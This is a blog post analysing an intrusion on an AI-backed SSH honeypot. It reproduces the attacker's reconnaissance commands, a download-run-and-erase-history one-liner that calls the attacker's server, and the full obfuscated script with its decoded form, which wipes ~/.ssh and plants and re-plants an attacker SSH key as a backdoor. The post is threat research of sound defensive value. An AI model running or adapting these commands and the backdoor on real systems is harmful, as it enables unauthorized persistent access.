+++
title = "[EN] A Honeypot Research"
date = "2025-11-16T21:30:48+01:00"
tags = ["honeypot", "soc", "hetzner", "linux", "beelzebub"]
categories = ["SOC"]
author = "Soner Sahin"
image = "/images/ahoneypotresearch/cover.png"
+++ 


Hi everyone! In this article, I would like to share my latest research about a script I've recently observed on my honeypot project.

Recently, I spun up an AI-supported honeypot called [Beelzebub](https://github.com/mariocandela/beelzebub), a simple, AI-supported honeypot, to hunt bad actors and analyze their behaviors after gaining access to a machine.

I used a simple SSH configuration file with a valid ChatGPT API key to make this machine AI-supported.

```yaml
apiVersion: "v1"
protocol: "ssh"
address: ":2222"
description: "SSH interactive ChatGPT"
commands:
  - regex: "^(.+)$"
    plugin: "LLMHoneypot"
serverVersion: "OpenSSH"
serverName: "ubuntu"
passwordRegex: "^(jenkins123|Admin123|admin123|test123|password|Password|123456)$"
deadlineTimeoutSeconds: 6000
plugin:
  llmProvider: "openai"
  llmModel: "gpt-4o"
  openAISecretKey: "sk-proj"
```

Let's get our hands dirty.

As soon as I opened the relevant port to the internet, attackers started attempting to gain access by trying different username-password combinations. 

Fortunately, the username-password combination wasn't difficult to guess, roughly 10 minutes later, I observed a successful login on my SSH honeypot from `213.165.90.65`.

![Beelzebub](/images/ahoneypotresearch/1.png)

![Beelzebub](/images/ahoneypotresearch/3.png)

![Beelzebub](/images/ahoneypotresearch/4.png)

As soon as the attacker gained access to the machine, they performed several commands in quick succession, likely using automated tools.

Let's have a look at the commands the attacker executed.

```sh
#Gathering system information
root@ubuntu:~$ uname -s -v -n -r -m
Linux ubuntu-machine 5.15.0-101-generic #59-Ubuntu SMP Fri Oct 22 12:00:00 UTC 2023 x86_64

#Finds out how long the server has been running.
root@ubuntu:~$ uptime | grep -ohe 'up .*' | sed 's/,//g' | awk '{ print $2" "$3 }'
3 days

#Counting NVIDIA GPUs
root@ubuntu:~$ if command -v lspci &>/dev/null; then lspci | egrep VGA | grep NVIDIA | awk '{print $5}' |wc -l; else nvidia-smi -q | grep "Product Name" | awk '{print $4, $5, $6, $7, $8, $9, $10, $11}' |wc -l; fi
1

#Detailed information about the CPU architecture
root@ubuntu:~$ lscpu | egrep "Model name:" | cut -d ' ' -f 14-
i7-10510U CPU @ 1.80GHz

#Finding ASN Provider
root@ubuntu:~$ curl ipinfo.io/org
AS15169 Google LLC

#Prints the number of available CPU cores.
root@ubuntu:~$ nproc
8

#It prints only the hardware architecture
root@ubuntu:~$ uname -m
x86_64

#Internal network reconnaissance
root@ubuntu:~$ ip r | grep -Eo '[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/[0-9]{1,2}'
192.168.1.0/24

#User enumeration
root@ubuntu:~$ cat /etc/passwd |grep -v nologin |grep -v false |grep -v sync |grep -v halt|grep -v shutdown|cut -d: -f1
root 
daemon 
bin 
sys 
sync 
games 
man 
lp 
mail 
news 
uucp 
proxy 
www-data 
backup 
list 
irc 
gnats 
nobody 
systemd-network 
systemd-resolve 
syslog 
messagebus 
_apt 
lxd 
uuidd 
dnsmasq 
statd 
sshd 
user

#Downloading the payload and cleaning.
root@ubuntu:~$ wget 196.251.116.58/fakewhiteblack.sh || curl -O 196.251.116.58/fakewhiteblack.sh ;chmod +x fakewhiteblack.sh ;./fakewhiteblack.sh ;rm -rf fakewhiteblack.sh ;clear ;history -c; rm -rf ~/.ash_history
--2023-10-05 12:00:00-- http://196.251.116.58/fakewhiteblack.sh 
Connecting to 196.251.116.58:80... failed: Connection refused. 
curl: (7) Failed to connect to 196.251.116.58 port 80: Connection refused
```

After performing some discover activities he tried to upload a script file from `196.251.116.58`.

![Beelzebub](/images/ahoneypotresearch/6.png)


![Beelzebub](/images/ahoneypotresearch/7.png)

![Beelzebub](/images/ahoneypotresearch/8.png)


![Beelzebub](/images/ahoneypotresearch/5.png)


![Beelzebub](/images/ahoneypotresearch/9.png)

Here is a quick analysis of the script.

```bash
┌─[user@parrot]─[~/Downloads]
└──╼ $file fakewhiteblack.sh 
fakewhiteblack.sh: ASCII text, with very long lines (1738)

┌─[user@parrot]─[~/Downloads]
└──╼ $md5sum fakewhiteblack.sh 
34a9da87c46cd948207644a4a5b98f72  fakewhiteblack.sh
```

The hash value of the script wasn't flagged in any threat intelligence platforms.

![Beelzebub](/images/ahoneypotresearch/1.png)

Let's see what the script contains. I have already downloaded it in a sandbox environment. Here is its content. 

```bash
z="
";TBz='EYBB';xCz='utho';SBz='v1VS';dBz='/7Tz';WCz='then';gCz='='\''cp';Vz='bvTZ';NBz='7Xif';nBz='aFx6';LCz='hmod';pCz='r /v';mz='O9wM';pBz='o99y';Qz='AADA';Jz='o "s';bz='WA0j';ABz='St98';BDz='ys; ';sBz='xI10';Tz='QC83';VCz='gs ]';iCz='='\''mv';Xz='XcU5';DDz='p 0.';oz='hPc4';tBz='O19O';lz='qitk';BCz='5/Y5';jCz='" > ';CCz='zcF ';Kz='sh-r';GCz='auth';hBz='djNw';Sz='AABA';hz='7RHi';tCz='if g';mBz='MHP3';az='dCtY';uBz='zjyq';eBz='JLCS';IDz='fi';rz='ehn+';Iz=' ech';ACz='WMDg';NCz='go= ';UCz='/.lo';gz='CJjm';cBz='WwRE';FCz='ssh/';DBz='DKyA';LBz='vzIT';wz='UAFg';RCz=' -d ';lCz='ashr';ez='6G9V';pz='EY4A';PBz='CujE';nCz='else';tz='/rT9';Dz='rf ~';vCz='-q A';yCz='rize';Oz='C1yc';IBz='z+Ux';UBz='Y1kj';DCz='" >>';FBz='CA7p';dz='tda8';HDz='"';Bz=' && ';XBz='WSKk';kCz='~/.b';iz='KKih';OCz='~/.s';HCz='oriz';CDz='slee';jz='4EwR';FDz='o '\''s';iBz='lxZQ';KBz='Udgu';oCz='mkdi';KCz='&& c';MCz=' -R ';YCz=' "# ';HBz='BX37';BBz='NYMm';PCz='sh';ECz=' ~/.';bBz='K0Fb';qz='7oed';wCz='sh/a';uz='VKSe';qBz='Q0Yx';EDz='01';aBz='+xGT';kBz='aDA6';RBz='ZYKl';Mz='AAAB';ADz='d_ke';dCz='='\''rm';lBz='lwVo';ZCz='.bas';gBz='DNnZ';MBz='pSgo';Lz='sa A';Pz='2EAA';Hz='ir ~';jBz='Obi+';Zz='hh0H';qCz='ar/t';Gz=' mkd';Uz='VuG3';OBz='nCvg';fBz='RCRh';yBz='wvdQ';CBz='SVXg';Wz='HZUP';TCz='/tmp';JCz='eys ';QBz='zy09';YBz='Perx';eCz=' -i'\''';mCz='c';cz='orx8';Cz='rm -';rBz='gzv2';Rz='QABA';EBz='SW9T';Yz='dhOA';SCz='/var';bCz='alia';rCz='mp/.';sCz='logs';xBz='64Je';xz='LilC';hCz='s mv';aCz='hrc';yz='/lvB';JBz='t0Ko';sz='2sY5';WBz='uwRx';VBz='oN0m';GBz='tgCq';vz='0pmA';XCz='echo';wBz='af4Z';uCz='rep ';oBz='/oBP';GDz=''\'' >>';nz='f4Ig';kz='lnyH';cCz='s rm';QCz='if [';Fz='h &&';Az='cd ~';Nz='3Nza';fz='QXPd';vBz='Ks+l';ICz='ed_k';Ez='/.ss';fCz='s cp';ZBz='n0mX';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Ez$Fz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$aBz$bBz$cBz$dBz$eBz$fBz$gBz$hBz$iBz$jBz$kBz$lBz$mBz$nBz$oBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$BCz$CCz$DCz$ECz$FCz$GCz$HCz$ICz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$z$QCz$RCz$SCz$TCz$UCz$VCz$z$WCz$z$XCz$YCz$ZCz$aCz$z$bCz$cCz$dCz$eCz$z$bCz$fCz$gCz$eCz$z$bCz$hCz$iCz$eCz$z$jCz$kCz$lCz$mCz$z$nCz$z$oCz$pCz$qCz$rCz$sCz$z$XCz$YCz$ZCz$aCz$z$bCz$cCz$dCz$eCz$z$bCz$fCz$gCz$eCz$z$bCz$hCz$iCz$eCz$z$tCz$uCz$vCz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$aBz$bBz$cBz$dBz$eBz$fBz$gBz$hBz$iBz$jBz$kBz$lBz$mBz$nBz$oBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$BCz$CCz$OCz$wCz$xCz$yCz$ADz$BDz$WCz$z$CDz$DDz$EDz$z$nCz$z$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Ez$Fz$Iz$FDz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$aBz$bBz$cBz$dBz$eBz$fBz$gBz$hBz$iBz$jBz$kBz$lBz$mBz$nBz$oBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$BCz$CCz$GDz$ECz$FCz$GCz$HCz$ICz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$z$HDz$z$IDz"
```

Here is the decoded version of the script.

```bash
┌─[user@parrot]─[~/Downloads]
└──╼ $sed 's/^eval/echo/' fakewhiteblack.sh > decoded.sh

┌─[user@parrot]─[~/Downloads]
└──╼ $bash decoded.sh
cd ~ && rm -rf ~/.ssh && mkdir ~/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC83VuG3bvTZHZUPXcU5dhOAhh0HdCtYWA0jorx8tda86G9VQXPdCJjm7RHiKKih4EwRlnyHqitkO9wMf4IghPc4EY4A7oedehn+2sY5/rT9VKSe0pmAUAFgLilC/lvBSt98NYMmSVXgDKyASW9TCA7ptgCqBX37z+Uxt0KoUdguvzITpSgo7XifnCvgCujEzy09ZYKlv1VSEYBBY1kjoN0muwRxWSKkPerxn0mX+xGTK0FbWwRE/7TzJLCSRCRhDNnZdjNwlxZQObi+aDA6lwVoMHP3aFx6/oBPo99yQ0Yxgzv2xI10O19OzjyqKs+laf4Z64JewvdQWMDg5/Y5zcF " >> ~/.ssh/authorized_keys && chmod -R go= ~/.ssh
if [ -d /var/tmp/.logs ]
then
echo "# .bashrc
alias rm='rm -i'
alias cp='cp -i'
alias mv='mv -i'
" > ~/.bashrc
else
mkdir /var/tmp/.logs
echo "# .bashrc
alias rm='rm -i'
alias cp='cp -i'
alias mv='mv -i'
if grep -q AAAAB3NzaC1yc2EAAAADAQABAAABAQC83VuG3bvTZHZUPXcU5dhOAhh0HdCtYWA0jorx8tda86G9VQXPdCJjm7RHiKKih4EwRlnyHqitkO9wMf4IghPc4EY4A7oedehn+2sY5/rT9VKSe0pmAUAFgLilC/lvBSt98NYMmSVXgDKyASW9TCA7ptgCqBX37z+Uxt0KoUdguvzITpSgo7XifnCvgCujEzy09ZYKlv1VSEYBBY1kjoN0muwRxWSKkPerxn0mX+xGTK0FbWwRE/7TzJLCSRCRhDNnZdjNwlxZQObi+aDA6lwVoMHP3aFx6/oBPo99yQ0Yxgzv2xI10O19OzjyqKs+laf4Z64JewvdQWMDg5/Y5zcF ~/.ssh/authorized_keys; then
sleep 0.01
else
cd ~ && rm -rf ~/.ssh && mkdir ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC83VuG3bvTZHZUPXcU5dhOAhh0HdCtYWA0jorx8tda86G9VQXPdCJjm7RHiKKih4EwRlnyHqitkO9wMf4IghPc4EY4A7oedehn+2sY5/rT9VKSe0pmAUAFgLilC/lvBSt98NYMmSVXgDKyASW9TCA7ptgCqBX37z+Uxt0KoUdguvzITpSgo7XifnCvgCujEzy09ZYKlv1VSEYBBY1kjoN0muwRxWSKkPerxn0mX+xGTK0FbWwRE/7TzJLCSRCRhDNnZdjNwlxZQObi+aDA6lwVoMHP3aFx6/oBPo99yQ0Yxgzv2xI10O19OzjyqKs+laf4Z64JewvdQWMDg5/Y5zcF ' >> ~/.ssh/authorized_keys && chmod -R go= ~/.ssh
"
fi
```


### Step 1: Initial Cleanup - Removing Entire SSH Folder and Creating a New One

The script first removes the entire `~/.ssh` directory, which eliminates all existing SSH keys, configurations, and known_hosts files. This ensures a clean slate before installing the attacker's backdoor.

```bash
cd ~ && rm -rf ~/.ssh && mkdir ~/.ssh
```

### Step 2: Install Attacker's SSH Key

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC83VuG3bvTZHZUPXcU5dhOAhh0HdCtYWA0jorx8tda86G9VQXPdCJjm7RHiKKih4EwRlnyHqitkO9wMf4IghPc4EY4A7oedehn+2sY5/rT9VKSe0pmAUAFgLilC/lvBSt98NYMmSVXgDKyASW9TCA7ptgCqBX37z+Uxt0KoUdguvzITpSgo7XifnCvgCujEzy09ZYKlv1VSEYBBY1kjoN0muwRxWSKkPerxn0mX+xGTK0FbWwRE/7TzJLCSRCRhDNnZdjNwlxZQObi+aDA6lwVoMHP3aFx6/oBPo99yQ0Yxgzv2xI10O19OzjyqKs+laf4Z64JewvdQWMDg5/Y5zcF " >> ~/.ssh/authorized_keys
```

### Step 3: Set Permissions

```bash
chmod -R go= ~/.ssh
```

### Step 4: Check for Persistence Marker

- Checks if the directory `/var/tmp/.logs` exists.
- This acts as a "flag" to indicate if the script has run before.
- If the directory exists, it overwrites the user's `.bashrc` file with aliases that make `rm`, `cp`, and `mv` interactive (preventing accidental deletions).
- If `/var/tmp/.logs` does not exist, it creates the directory and then modifies `.bashrc` with the same aliases.

```bash
if [ -d /var/tmp/.logs ]
then
echo "# .bashrc
alias rm='rm -i'
alias cp='cp -i'
alias mv='mv -i'
" > ~/.bashrc
else
mkdir /var/tmp/.logs
echo "# .bashrc
alias rm='rm -i'
alias cp='cp -i'
alias mv='mv -i'
```

### Step 5: Verify Installation

- Checks if the attacker's SSH key is present in `~/.ssh/authorized_keys`
- If found, waits 0.01 seconds (likely to avoid detection or timing issues)
- If NOT found, recursively runs the entire script again (Steps 1-4) until the key is successfully installed

This verification loop ensures persistence - even if someone removes the SSH key, the script will attempt to reinstall it.

```bash
if grep -q AAAAB3NzaC1yc2EAAAADAQABAAABAQC83VuG3bvTZHZUPXcU5dhOAhh0HdCtYWA0jorx8tda86G9VQXPdCJjm7RHiKKih4EwRlnyHqitkO9wMf4IghPc4EY4A7oedehn+2sY5/rT9VKSe0pmAUAFgLilC/lvBSt98NYMmSVXgDKyASW9TCA7ptgCqBX37z+Uxt0KoUdguvzITpSgo7XifnCvgCujEzy09ZYKlv1VSEYBBY1kjoN0muwRxWSKkPerxn0mX+xGTK0FbWwRE/7TzJLCSRCRhDNnZdjNwlxZQObi+aDA6lwVoMHP3aFx6/oBPo99yQ0Yxgzv2xI10O19OzjyqKs+laf4Z64JewvdQWMDg5/Y5zcF ~/.ssh/authorized_keys; then
sleep 0.01
else
cd ~ && rm -rf ~/.ssh && mkdir ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC83VuG3bvTZHZUPXcU5dhOAhh0HdCtYWA0jorx8tda86G9VQXPdCJjm7RHiKKih4EwRlnyHqitkO9wMf4IghPc4EY4A7oedehn+2sY5/rT9VKSe0pmAUAFgLilC/lvBSt98NYMmSVXgDKyASW9TCA7ptgCqBX37z+Uxt0KoUdguvzITpSgo7XifnCvgCujEzy09ZYKlv1VSEYBBY1kjoN0muwRxWSKkPerxn0mX+xGTK0FbWwRE/7TzJLCSRCRhDNnZdjNwlxZQObi+aDA6lwVoMHP3aFx6/oBPo99yQ0Yxgzv2xI10O19OzjyqKs+laf4Z64JewvdQWMDg5/Y5zcF' >> ~/.ssh/authorized_keys && chmod -R go= ~/.ssh
"
fi
```

I haven't seen any other activities related to this attack, but I assume this is an unsuccessful cryptojacking attack because of commands and google searches that I've done.

This research demonstrates how attackers quickly move to establish persistence once they gain initial access. 

For security professionals, this highlights the importance of:
- Monitoring SSH access and authentication logs
- Regularly auditing system files for unauthorized modifications
- Using honeypots to understand attacker behaviors and TTPs (Tactics, Techniques, and Procedures)

The fact that this script's hash wasn't flagged in threat intelligence platforms underscores the importance of behavioral detection and proactive security measures rather than relying solely on signature-based detection.

Thank you for taking time to read this article, I hope you will find it helpful.

Keep up the great work!
